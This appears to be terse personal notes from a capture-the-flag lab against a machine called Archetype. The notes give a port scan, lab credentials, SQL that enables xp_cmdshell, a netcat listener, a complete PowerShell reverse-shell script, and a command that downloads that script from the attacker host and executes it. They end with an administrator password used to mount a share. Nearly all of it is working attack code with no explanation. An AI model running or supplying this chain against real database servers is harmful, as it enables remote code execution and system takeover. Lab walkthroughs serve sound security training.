# Scan





## Oopsie

## Archetype 10.10.10.27
### scang
PORT STATE SERVICE
- 135/tcp open msrpc
- 139/tcp open netbios-ssn
- 445/tcp open microsoft-ds
- 1433/tcp open ms-sql-s

### attack
Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;

 this turns on advanced options and is needed to configure xp_cmdshell
`sp_configure 'show advanced options', '1'
RECONFIGURE
-- this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
`

nc -nlvp 5555

rs.ps1
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.224",5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = ( New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```



python3 -m http.server 80

xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.224/rs.ps1\");"


net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!